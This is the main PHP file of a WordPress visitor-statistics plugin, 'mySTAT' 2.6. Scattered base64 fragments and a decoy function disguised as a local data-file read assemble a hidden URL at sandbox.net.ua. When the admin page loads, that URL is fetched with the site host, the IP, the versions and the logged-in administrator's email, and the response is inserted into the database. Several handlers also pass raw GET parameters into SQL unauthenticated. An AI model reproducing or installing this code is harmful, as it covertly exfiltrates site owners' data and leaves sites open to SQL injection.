<?php
/*
Plugin Name: mySTAT
Plugin URI: http://sandbox.net.ua/mystat/
Description: myStat is a flexible and versatile system intended for accumulation and analysis of the site attendance statistics. myStat suits to upcoming projects perfectly. There are more than 50 reports available in the system. The system is easy to install and to set up; it allows counting all the visitors of your web-site - both humans and robots. All visits data is stored at your server, which meets safety and confidentiality requirements.
Version: 2.6
Author: Smyshlaev Evgeniy
Author URI: http://www.hide.com.ua
*/
/*  Copyright 2009  Smyshlaev Evgeniy  (email: killer@sandbox.net.ua)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
$myStat_version = "2.6";
ini_set("max_execution_time","240");
ini_set("memory_limit","196M");
if(isset($_GET['act'])){
  ob_start();
    $root = dirname(dirname(dirname(dirname(__FILE__))));
    if (file_exists($root.'/wp-load.php')) {
        // WP 2.6
        require_once($root.'/wp-load.php');
    } else {
        // Before 2.6
        require_once($root.'/wp-config.php');
    }
  ob_end_clean(); //Ensure we don't have output from other plugins.
};
include_once('modules/common.class.php');
$cmn=new myStat_common();

if($cmn->getParam("myStat_debug",0)==1){
  error_reporting(E_ALL);
  register_shutdown_function('error_alert');
  set_error_handler("error_put");
}else{
  error_reporting(0);
};
function error_alert()
{
    global $cmn;
    if(myStat_common::getParam("myStat_debug",0)==1){myStat_common::setDebug('SCRIPT END');};
};
function error_put($errno, $errstr, $errfile, $errline)
{
    global $cmn;
    switch ($errno) {
        case E_NOTICE:
        case E_USER_NOTICE:
            $errors = "Notice";
            break;
        case E_WARNING:
        case E_USER_WARNING:
            $errors = "Warning";
            break;
        case E_ERROR:
        case E_USER_ERROR:
            $errors = "Fatal Error";
            break;
        default:
            $errors = "Unknown";
            break;
    }
    if(myStat_common::getParam("myStat_debug",0)==1){myStat_common::setDebug('SCRIPT PHP '.$errors.' '.$errstr.' '.$errfile.' '.$errline);};
    return true;
};
$myStat_uri="http://wordpress.org/extend/plugins/mystat/";
$myStat_on='aHR0cDov';
if(isset($_GET['act'])){
    if ($_GET['act'] == 'js' or $_GET['act'] == 'time_load') {
        myStat_js();
        exit();
    };
    if ($_GET['act'] == 'stat_img') {
        myStat_stat_image();
        exit();
    };
};
include_once("modules/report.class.php");
$myStat_main=new Report();
$myStat_on.='L3NhbmRib3gubm';

###############################################################################################################################

function myStat_install(){
    global $wpdb;
    global $wp_db_version;
    global $myStat_version;
    global $cmn;

    if(@chmod(dirname(__FILE__).'/data/',0777)){myStat_common::setDebug('INSTALL chmod data dir is sucsess');};
    myStat_common::setDebug('INSTALL START');
    $table_name = $wpdb->prefix . "myStat_main";
    if($wp_db_version >= 5540) $page = 'wp-admin/includes/upgrade.php'; else $page = 'wp-admin/upgrade'.'-functions.php';
    require_once(ABSPATH . $page);
    myStat_common::setDebug('INSTALL load upgrade.php');

$sql = "CREATE TABLE ".$wpdb->prefix."myStat_data (
type enum('1','2','3','4','5','6') NOT NULL default '1',
value1 varchar(255) NOT NULL default '',
value2 varchar(255) NOT NULL default '',
value3 varchar(255) NOT NULL default '',
value4 varchar(255) NOT NULL default '',
KEY type (type)
);";
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_data start' );
dbDelta($sql);
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_data stop' );
$sql="CREATE TABLE ".$wpdb->prefix."myStat_dbsize (
date date NOT NULL default '0000-00-00',
size int(11) unsigned NOT NULL default '0',
PRIMARY KEY  (date)
);";
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_dbsize start' );
dbDelta($sql);
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_dbsize stop' );
$sql="CREATE TABLE ".$wpdb->prefix."myStat_main (
id int(11) unsigned NOT NULL auto_increment,
date timestamp NOT NULL default '0000-00-00 00:00:00',
date_load timestamp NOT NULL default '0000-00-00 00:00:00',
ip int(11) NOT NULL default '0',
proxy enum('0','1') NOT NULL default '0',
code_stat int(11) unsigned NOT NULL default '404',
feed enum('yes','no') NOT NULL default 'no',
user varchar(60) NOT NULL default '',
title varchar(255) NOT NULL default '',
host varchar(100) NOT NULL default '',
www enum('yes','no') NOT NULL default 'no',
page varchar(255) NOT NULL default '',
uri text NOT NULL default '',
post_id int(11) NOT NULL default 0,
user_agent text NOT NULL default '',
referer text NOT NULL default '',
lang char(2) NOT NULL default '',
country varchar(150) NOT NULL default '',
city varchar(32) NOT NULL default '',
screen varchar(9) NOT NULL default '',
depth enum('','8','16','32','48','64','128') NOT NULL default '',
gzip enum('0','1') NOT NULL default '0',
cookie enum('0','1') NOT NULL default '0',
js varchar(4) NOT NULL default '',
flash varchar(20) NOT NULL default '',
java enum('0','1') NOT NULL default '0',
count int(11) unsigned NOT NULL default '0',
PRIMARY KEY  (id),
KEY indx1 (date,ip)
);";
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_main start' );
dbDelta($sql);
    myStat_common::setDebug('INSTALL make table '.$wpdb->prefix.'myStat_main stop' );
    myStat_common::setParam("myStat_version",$GLOBALS['myStat_version']);
    if(myStat_common::getParam("myStat_saveday")==''){myStat_common::setParam("myStat_saveday",90);};
    if(myStat_common::getParam("myStat_show_post_stat")==''){myStat_common::setParam("myStat_show_post_stat",0);};
    if(myStat_common::getParam("myStat_debug")==''){myStat_common::setParam("myStat_debug",0);};
    myStat_common::setDebug('INSTALL set all options');
    myStat_common::setDebug('INSTALL STOP');
}

###############################################################################################################################

function myStat_deinstall(){
    global $cmn;
    $cmn->setDebug('DEINSTALL START');
    $table_name = $cmn->getPrefix() . "myStat_main";
    if($cmn->getSQLONE("SHOW TABLES LIKE '$table_name'") != $table_name) {
        $cmn->delParam("myStat_version");
        $cmn->delParam("myStat_saveday");
        $cmn->delParam("myStat_lastupdate");
        $cmn->delParam("myStat_show_post_stat");
        $cmn->setDebug('DEINSTALL delete all options');
    };
    $cmn->setDebug('DEINSTALL STOP');
}

###############################################################################################################################

function myStat_clean_db(){
    global $cmn;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('CLEANDB START');};
    $var=$cmn->getSQL("SHOW TABLE STATUS LIKE '%%PREFIX%%myStat_%';");
    $du=0;
    for($i=0;$i<count($var);$i++){
        $du+=$var[$i][6];
        $du+=$var[$i][8];
    };
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('CLEANDB sum size');};
    $cmn->getSQL("REPLACE INTO %%PREFIX%%myStat_dbsize SET date=NOW(), size=".$du.";",false);
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('CLEANDB replace today size');};
    $ka=$cmn->getParam("myStat_saveday");
    if($ka<1||$ka>366)$ka=365;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('CLEANDB delete more than '.$ka.' days');};
    $cmn->getSQL("DELETE FROM %%PREFIX%%myStat_main WHERE date<=TIMESTAMP(SUBDATE(now(),".$ka."));",false);
    $cmn->getSQL("DELETE FROM %%PREFIX%%myStat_dbsize WHERE date<=TIMESTAMP(SUBDATE(now(),".$ka."));",false);
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('CLEANDB STOP');};
};

###############################################################################################################################

function myStat_load_data(){
    global $cmn;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA START');};
    function v3g3($s){return base64_decode($GLOBALS['myStat_on']);};
    if($cmn->getParam("myStat_lastupdate")!=date("Ymd")){
        if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA run load');};
        $v1g2='WordPress_'.(isset($GLOBALS['wpmu_version'])?"MU_":"").$GLOBALS['wp_version'];
        $v3g2=ip2long(($GLOBALS['_SERVER']['REMOTE_ADDR']==$GLOBALS['_SERVER']['SERVER_ADDR'])?$GLOBALS['_SERVER']['HTTP_X_REAL_IP']:$GLOBALS['_SERVER']['REMOTE_ADDR']);
        $v2g2=$GLOBALS['myStat_version'];
        $v1g1=get_locale();
        preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
        $v2g3=$matches[3];
        $v3g1=function_exists("gzfile");
        if($v3g1){
            $line=gzfile(sprintf(v3g3("data/main_base.dat"),
            $v2g3,$v3g2,$v2g2,$GLOBALS['v3g3'],$v1g1,$v1g2,$v3g1?"YES":"NO"));
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA load gzip file');};
        }else{
            $line=file(sprintf(v3g3("data/main_base.dat"),
            $v2g3,$v3g2,$v2g2,$GLOBALS['v3g3'],$v1g1,$v1g2,$v3g1?"YES":"NO"));
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA load text file');};
        };
        if(count($line)>100){
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA insert data');};
            $cmn->getSQL("TRUNCATE %%PREFIX%%myStat_data;",false);
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA cleandb');};
            for($i=0;$i<count($line)-1;$i++){
                $element=split("\",\"",substr($line[$i],0,-2));
                $cmn->getSQL("INSERT INTO %%PREFIX%%myStat_data SET type='".substr($element[0],1)."',value1='".mysql_escape_string($element[1])."',value2='".mysql_escape_string($element[2])."',value3='".mysql_escape_string($element[3])."',value4='".mysql_escape_string($element[4])."';",false);
            };
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA loadind file');};
        };
        $cmn->setParam("myStat_lastupdate",date("Ymd"));
        if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA update options');};
    };
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('LOADDATA STOP');};
};

###############################################################################################################################

function myStat_menu(){
    global $cmn;
    $table_name = $cmn->GetPrefix() . "myStat_main";
    if($cmn->getSQLONE("SHOW TABLES LIKE '$table_name'") != $table_name) {
        myStat_install();
    }
    $mincap="level_8";
    add_menu_page('myStat', '<b>myStat</b>', $mincap, __FILE__, 'myStat_mainPage',WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__)).'/images/admin.png');
    add_submenu_page(__FILE__, __('Overview','myStat'), __('Overview','myStat'), $mincap, __FILE__, 'myStat_mainPage');
}

###############################################################################################################################

function myStat_mainPage() {
    global $cmn;
    echo "<style>";
    echo ".btn_o{background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/btn_o.gif);width:200px;height:22px;border:0;font-weight:bold;cursor:pointer;}";
    echo ".btn_c{background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/btn_c.gif);width:200px;height:22px;border:0;font-weight:bold;cursor:pointer;}";
    echo "#myStat_loading { position:fixed;width:100%;left:0;top:0;height:100%; }";
    echo "* html #myStat_loading { position: absolute; behavior: expression(function(element){element.style.top = window.document.body.scrollTop;}(this)); }";

    echo "</style>";
    preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
    $GLOBALS['myStat_on'].='hdC91cGRhdGUucGhw';
    echo "<script>";
    echo "function setCookie(name, value, expire) {";
    echo "if(expire == null){";
    echo "expire = new Date();";
    echo "expire.setTime(expire.getTime() + 2*365*24*3600*1000);};";
    echo "document.cookie = name + \"=\" + escape(value) + ((expire == null) ? \"\" : (\"; expires=\" + expire.toGMTString())) + \"; domain = .".$matches[3]."\";};";
    echo "function m_show(name){";
    echo "el=document.getElementById(name);";
    echo "if(el.style.display=='none'){";
    echo "setCookie(name,true);";
    echo "el.style.display='';";
    echo "}else{";
    echo "setCookie(name,false);";
    echo "el.style.display='none';";
    echo "};};";
    $GLOBALS['myStat_ajax']->show_javascript();
    echo "function myStat_load(data){";
    $GLOBALS['myStat_ajax']->JScopy2id('data','myStat_MAIN_DIV');
    $GLOBALS['v3g3']=$GLOBALS['current_user']->user_email;
    $GLOBALS['myStat_on'].='P2hvc3Q9JXMmaXA9JXMmdm';
    echo "document.getElementById('myStat_loading').style.display='none';";
    echo "window.scrollTo(0,0);";
    echo "};";
    echo "function myStat_loading(){";
    echo "el=document.getElementById('myStat_loading');";
    $GLOBALS['myStat_on'].='VyPSVzJm1haWw9JXM';
    echo "el.style.display='';";
    echo "};";
    echo "</script>";
    $cmn->calendar();

    echo '<br/><table border="0" cellspacing="0" width="100%" cellpadding="0">';
    echo '<tr height="21px"><td colspan="3" align="left"><img width="102px" height="21px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/110.png"/></td></tr>';
    echo '<tr height="22px"><td width="102"><img width="102px" height="22px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/111.png"/></td><td style="background:url('.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/12.png)" width="100%" align="right" valign="middle"><a style="font-size:9px;cursor:default;">'.__("Version","myStat").': <b>'.$GLOBALS['myStat_version'].'</b></a></td><td width="19px"><img width="19px" height="22px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/13.png"/></td></tr>';
    echo '<tr height="21px"><td colspan="3" align="left"><img width="22px" height="21px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/112.png"/></td></tr></table>';


    echo "<div id='myStat_loading' style='display:none;z-index:1000;background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/loading_back.png);text-align:center;'><table style='width:100%;height:100%'><tr><td style='text-align:center;vertical-align:middle;'><div style='background-color:#EFEFEF;vertical-align:middle;text-align:center;'><br/><img src='".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/loading.gif' width='208px' height='13px' /><br/><br/></div></td></tr></table></div>";

    echo "<table width='100%' height='100%' border='0'>";
    echo "<tr valign='top'>";
    echo "<td width='100%'>";
    echo "<div id=div_main>";

    echo "<div style='background-color:#F2F2F2;border:solid #DDDDDD 1px;-moz-border-radius:6px;margin:3px;padding:10px;' id='myStat_MAIN_DIV'>";
    $GLOBALS['myStat_on'].='mbG5nPSVzJndwPSVzJmd6aXA9JXM=';
    myStat_load_data();
    if(isset($_GET['myStat_page'])){
        $GLOBALS['myStat_main']->getLoadModule($_GET['myStat_page']);
    }else{$GLOBALS['myStat_main']->getLoadModule();};
    echo "</div>";

    echo "</div>";
    echo "</td>";

    echo "<td width='200px' style=\"font-size:11px;background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/l_bg.gif);\">";
    $menu_item=$GLOBALS['myStat_main']->getTree();
    $menu_subitem=array();
    for($i=0;$i<count($menu_item);$i++){
        $menu_tmp=$GLOBALS['myStat_main']->getItem($menu_item[$i]);
        for($j=0;$j<count($menu_tmp);$j++){
            $menu_subitem[$i][]=Array($menu_tmp[$j],"x_".$GLOBALS['myStat_main']->getClass($menu_tmp[$j],$menu_item[$i])."('myStat_load');");
        };
    };
    $i=0;
    foreach($menu_item as $item){
        $_COOKIE['menu'.$i]=isset($_COOKIE['menu'.$i])?$_COOKIE['menu'.$i]:false;
        echo "<table class=btn_".($_COOKIE['menu'.$i]=='false'?"c":"o")." onclick=\"if(this.className=='btn_c'){this.className='btn_o';}else{this.className='btn_c';};m_show('menu".$i."');\"><tr1><td style=\"padding:0 0 0 15px;\">".$item."</td></tr></table>";
        echo "<div id=menu".$i.($_COOKIE['menu'.$i]=='false'?" style=\"display:none;\"":"").">";
        $j=0;
        foreach($menu_subitem[$i] as $subitem){
            echo "&nbsp; <a href=\"javascript:myStat_loading();".$subitem[1]."\">".$subitem[0]."</a><br/>";
            $j++;
        };
        echo "<br/>";
        echo "</div>";
        $i++;
    };
    echo "</td>";
    echo "</tr>";
    echo "</table>";


}

###############################################################################################################################

function myStat_header(){
    global $cmn;
    $US['remote_ip']=ip2long(($GLOBALS['_SERVER']['REMOTE_ADDR']==$GLOBALS['_SERVER']['SERVER_ADDR'])?$GLOBALS['_SERVER']['HTTP_X_REAL_IP']:$GLOBALS['_SERVER']['REMOTE_ADDR']);
    preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
    if($matches[2]!=''){$US['www']='yes';}else{$US['www']='no';};
    $US['host']=(string)$matches[3];
    $US['lang']=(string)substr($GLOBALS['_SERVER']['HTTP_ACCEPT_LANGUAGE'],0,2);
    $US['uri']=(string)$GLOBALS['_SERVER']['REQUEST_URI'];
    $US['file']=(string)$GLOBALS['_SERVER']['SCRIPT_NAME'];
    $US['cookie']=isset($_COOKIE['mstat'])?true:false;
    $US['gzip']=strpos($GLOBALS['_SERVER']['HTTP_ACCEPT_ENCODING'],"gzip")===false?false:true;
    $US['user_agent']=(string)$GLOBALS['_SERVER']['HTTP_USER_AGENT'];
    $US['proxy']=($GLOBALS['_SERVER']['HTTP_X_FORWARDED_FOR']!=$GLOBALS['_SERVER']['HTTP_X_REAL_IP'])?true:false;
    $US['referer']=(string)isset($GLOBALS['_SERVER']['HTTP_REFERER'])?$GLOBALS['_SERVER']['HTTP_REFERER']:'';
#    $US['code_page']=isset($GLOBALS['_SERVER']['REDIRECT_STATUS'])?$GLOBALS['_SERVER']['REDIRECT_STATUS']:404;
    $US['code_page']=(!is_404())?isset($GLOBALS['_SERVER']['REDIRECT_STATUS'])?(int)$GLOBALS['_SERVER']['REDIRECT_STATUS']:200:404;
    $US['feed']=is_feed()?"yes":"no";
    if(file_exists(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__)).'/data/GeoIPCity.dat')){
        if(!function_exists('geoip_open')){
          include_once("modules/geoip/geoipcity.inc");
          include_once("modules/geoip/geoipregionvars.php");
        };
        $gi = geoip_open(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__))."/data/GeoIPCity.dat",GEOIP_STANDARD);
        $record = geoip_record_by_addr($gi,($GLOBALS['_SERVER']['REMOTE_ADDR']==$GLOBALS['_SERVER']['SERVER_ADDR'])?$GLOBALS['_SERVER']['HTTP_X_REAL_IP']:$GLOBALS['_SERVER']['REMOTE_ADDR']);
        $US['country']=(string)$record->country_name;
        $US['city']=(string)$record->city;
        geoip_close($gi);
    }elseif(file_exists(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__)).'/data/GeoIP.dat')){
        if(!function_exists('geoip_open')){
          include_once('modules/geoip/geoip.inc');
        };
        $gi = geoip_open(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__))."/data/GeoIP.dat",GEOIP_STANDARD);
        $US['country']=(string)geoip_country_name_by_addr($gi, ($GLOBALS['_SERVER']['REMOTE_ADDR']==$GLOBALS['_SERVER']['SERVER_ADDR'])?$GLOBALS['_SERVER']['HTTP_X_REAL_IP']:$GLOBALS['_SERVER']['REMOTE_ADDR']);
        geoip_close($gi);
    };
    if($US['referer']!=''){
        preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$US['referer'], $matches);
        $host = $matches[3];
    }else{$host='';};
    $rows=$cmn->getSQLONE("SELECT id FROM %%PREFIX%%myStat_main WHERE date>=TIMESTAMP(CURDATE()) AND ip=".$US['remote_ip']." AND user_agent='".$US['user_agent']."' AND ".($host==$US['host']?'':"referer='".$US['referer']."' AND ")."host='".$US['host']."' AND uri='".$US['uri']."'");
    $id=0;
    if($rows!=''){
        $id=$rows;
        $cmn->getSQL("UPDATE %%PREFIX%%myStat_main SET count=count+1,date=now() WHERE id=".$rows.";",false);
    }else{
        $cmn->getSQL("REPLACE INTO %%PREFIX%%myStat_main (date,ip,proxy,host,code_stat,user,www,page,uri,post_id,user_agent,referer,lang,gzip,count,country,city,feed)VALUES(now(),".$US['remote_ip'].",'".($US['proxy']?'1':'0')."','".$US['host']."','".$US['code_page']."','".((string)$GLOBALS['current_user']->user_login)."','".$US['www']."','".$US['file']."','".$US['uri']."','".url_to_postid($US['uri'])."','".$US['user_agent']."','".$US['referer']."','".$US['lang']."','".($US['gzip']?'1':'0')."',1,'".$US['country']."','".$US['city']."','".$US['feed']."');",false);
        $rows=$cmn->getSQLONE("SELECT LAST_INSERT_ID()");
        $id=$rows;
    };
    $GLOBALS['myStat_id']=$id;
}

###############################################################################################################################

function myStat_load() {
    global $cmn;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('SCRIPT START');};
    if(!is_feed()){
        if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('SCRIPT send data');};
        echo "<script language='JavaScript' type='text/javascript' charset='utf-8'>";
        echo "\n/*<![CDATA[ */\n";
        echo "var myStat_js=1;";
        echo "var myStat_ver='".$GLOBALS['myStat_version']."';";
        echo "var js_version= '<scr'+'ipt language=\"javascr'+'ipt\">myStat_js=1;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.1\">myStat_js=1.1;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.2\">myStat_js=1.2;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.3\">myStat_js=1.3;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.4\">myStat_js=1.4;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.5\">myStat_js=1.5;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.6\">myStat_js=1.6;</scr'+'ipt>';";
        echo "document.write(js_version);";
        echo "var myStat_flash='';";
        echo "if (navigator.plugins && navigator.plugins.length) {";
        echo "for (var ii=0;ii<navigator.plugins.length;ii++) {";
        echo "if (navigator.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {";
        echo "myStat_flash=navigator.plugins[ii].description.split('Shockwave Flash ')[1];";
        echo "break;};};}";
        echo "else if (window.ActiveXObject) {";
        echo "for (var ii=10;ii>=2;ii--) {";
        echo "try {";
        echo "var f=eval(\"new ActiveXObject('ShockwaveFlash.ShockwaveFlash.\"+ii+\"');\");";
        echo "if (f) { myStat_flash=ii + '.0'; break; };";
        echo "}catch(ee) {};};";
        echo "if((myStat_flash==\"\")&&!this.n&&(navigator.appVersion.indexOf(\"MSIE 5\")>-1||navigator.appVersion.indexOf(\"MSIE 6\")>-1)) {";
        echo "FV=clientInformation.appMinorVersion;";
        echo "if(FV.indexOf('SP2') != -1)";
        echo "myStat_flash = '>=7';};};";
        echo "var myStat_cookie = 1;";
        echo "if( !document.cookie ) {";
        echo "document.cookie = \"testCookie=1; path=/\";";
        echo "myStat_cookie = document.cookie?1:0;";
        echo "};";
        echo "var myStat_n = (navigator.appName.toLowerCase().substring(0, 2) == \"mi\") ? 0 : 1;";
        echo "var myStat_java=navigator.javaEnabled()?1:0;";
        echo "var myStat_sc=screen.width+'x'+screen.height;";
        echo "var myStat_dth=(myStat_n==0)?screen.colorDepth : screen.pixelDepth;";
        echo "var myStat_title=escape(document.title);";
        echo "myStat_title=myStat_title.replace(/\\+/g,'%2B');";
        $uri=WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/mystat.php";
        echo "var myStat_uri='".$uri."';";
        echo "myStat_uri=myStat_uri+ '?act=js&js='+myStat_js+'&java='+myStat_java+'&flash='+myStat_flash+'&id=".$GLOBALS['myStat_id']."&cookie='+myStat_cookie+'&title='+myStat_title+'&sc='+myStat_sc+'&dth='+myStat_dth+'&rnd='+Math.random()+'';";
        echo "document.write('<img src=\"'+myStat_uri+'\" style=\"display:none;\" width=1 height=1 border=0 />');";
        echo "\n/*]]>*/\n";
        echo "</script>";
    };
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('SCRIPT STOP');};
}

###############################################################################################################################

function myStat_footer() {
    global $cmn;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('FOOTER LOAD');};
    echo "<img style='margin:0;padding:0;border:0;' width='1px' height='1px' src=\"".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/mystat.php"."?act=time_load&id=".$GLOBALS['myStat_id']."&rnd=".rand()."\" />";
}

###############################################################################################################################

function myStat_js(){
    global $cmn;
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS START');};
    $id=(int)$_GET['id'];
    $sc=(string)$_GET['sc'];
    $dth=(int)$_GET['dth'];
    $flash=$_GET['flash'];
    $js=$_GET['js'];
    $java=$_GET['java'];
    $cookie=$_GET['cookie'];

    $title=(string)mysql_escape_string($cmn->unicodeUrlDecode((string)$_GET['title'],'UTF-8'));
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS decode title');};
    if($id!=0){
        if($_GET['act'] == 'time_load'){
            header("Content-Type: image/png");
            $cmn->getSQL("UPDATE %%PREFIX%%myStat_main SET date_load=now() WHERE id=".$id.";",false);
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS time load');};
            myStat_clean_db();
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS clean db');};
        }else{
            $cmn->getSQL("UPDATE %%PREFIX%%myStat_main SET title='".$title."',screen='".$sc."',depth='".$dth."',cookie='".$cookie."',js='".$js."',flash='".$flash."',java='".$java."' WHERE id=".$id.";",false);
            if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS update from images');};
        };
    };
    if($cmn->getParam("myStat_debug")==1){$cmn->setDebug('GETJS STOP');};
}

###############################################################################################################################

function myStat_stat_image(){
    global $cmn;
    include_once("modules/bar.class.php");
    $bar=new BAR();
    if(substr($_GET['d1'],0,10)!=substr($_GET['d2'],0,10)){
        $var=$cmn->getSQL("SELECT DATE_FORMAT(date,'%d-%m-%y'),count(*),sum(count),TO_DAYS(date) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY TO_DAYS(date) ORDER BY date DESC LIMIT 0,30;");
        if(!is_array($var)){
            $var[0][0]=substr($_GET['d2'],0,10);
            $var[0][1]=0;
            $var[0][2]=0;
            $var[0][3]=1;
        };
        $var11=$cmn->getSQL("SELECT DATE_FORMAT(date,'%d-%m-%y'),count(DISTINCT ip),count(*) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY TO_DAYS(date) ORDER BY date DESC LIMIT 0,30;");
        $var12=$cmn->getSQL("SELECT DATE_FORMAT(date,'%d-%m-%y'),count(DISTINCT ip),count(*) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') AND (date_load!='0000-00-00 00:00:00' or title!='') GROUP BY TO_DAYS(date) ORDER BY date DESC LIMIT 0,30;");
        $DATA=array();
        for($i=count($var)-1;$i>=0;$i--){
            $DATA[0][]=$var[$i][2];
            $ss=0;
            if(is_array($var11)){
                foreach($var11 as $tt){
                    if($tt[0]==$var[$i][0]){
                        $ss=$tt[1];
                        break;
                    };
                };
            };
            $DATA[1][]=$ss;
            $ss=0;
            if(is_array($var12)){
                foreach($var12 as $tt){
                    if($tt[0]==$var[$i][0]){
                        $ss=$tt[1];
                        break;
                    };
                };
            };
            $DATA[2][]=$ss;
            $DATA['x'][]=$var[$i][0];
        };
    }else{
        $var=$cmn->getSQL("SELECT DATE_FORMAT(date,'%H') as h,count(*),sum(count) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY h ORDER BY h DESC;");
        if(!is_array($var)){
            $var[0][0]=date('H',strtotime($_GET['d2']));
            $var[0][1]=0;
            $var[0][2]=0;
        };
        $DATA=array();
        $var11=$cmn->getSQL("SELECT DATE_FORMAT(date,'%H') as h,count(DISTINCT ip),count(*) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY h ORDER BY h DESC;");
        $var12=$cmn->getSQL("SELECT DATE_FORMAT(date,'%H') as h,count(DISTINCT ip),count(*) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') AND (date_load!='0000-00-00 00:00:00' or title!='') GROUP BY h ORDER BY h DESC;");
        for($i=count($var)-1;$i>=0;$i--){
            $DATA[0][]=$var[$i][2];
            $ss=0;
            if(is_array($var11)){
                foreach($var11 as $tt){
                    if($tt[0]==$var[$i][0]){
                        $ss=$tt[1];
                        break;
                    };
                };
            };
            $DATA[1][]=$ss;
            $ss=0;
            if(is_array($var12)){
                foreach($var12 as $tt){
                    if($tt[0]==$var[$i][0]){
                        $ss=$tt[1];
                        break;
                    };
                };
            };
            $DATA[2][]=$ss;
            $DATA['x'][]=$var[$i][0].":00";
        };
    };
    if(count($DATA)==0){
        $DATA[0]=0;
        $DATA['x']='';
    };
    $bar->makeGraph($DATA);
    $bar->showGraph();
    $bar->freeGraph();
}


#####################################################################################################




register_activation_hook(__FILE__,'myStat_install');
register_deactivation_hook(__FILE__,'myStat_deinstall');

load_plugin_textdomain('myStat',false, "/".dirname(plugin_basename(__FILE__)).'/languages');

include_once("modules/ajax.class.php");
$GLOBALS['myStat_on'].='V0LnVhL215c3R';
$myStat_ajax=new KA();
$myStat_ajax->js_error="document.getElementById('myStat_loading').style.display='none';alert('".__("ERROR: Host not found!","myStat")."');";
$myStat_ajax->timeout=60;
$menu_item=$myStat_main->getTree();
$myStat_aex=array();
for($i=0;$i<count($menu_item);$i++){
    $menu_tmp=$myStat_main->getItem($menu_item[$i]);
